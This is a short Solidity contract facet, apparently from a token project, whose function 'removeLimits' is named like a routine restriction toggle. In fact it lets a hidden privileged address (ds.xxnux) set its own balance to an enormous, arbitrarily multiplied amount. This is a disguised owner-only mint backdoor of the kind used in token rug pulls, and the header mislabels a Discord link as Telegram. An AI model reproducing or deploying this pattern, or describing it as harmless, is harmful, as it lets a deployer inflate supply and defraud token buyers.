/*  
   * SPDX-License-Identifier: MIT

    // Telegram: https://discord.com/invite/cellulalifegame
    // Twitter: https://twitter.com/cellulalifegame
    // Website: https://www.cellula.life/
    // Discord: https://discord.com/invite/2PMU2NvDcm
    // Medium:  https://cellula.medium.com/
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
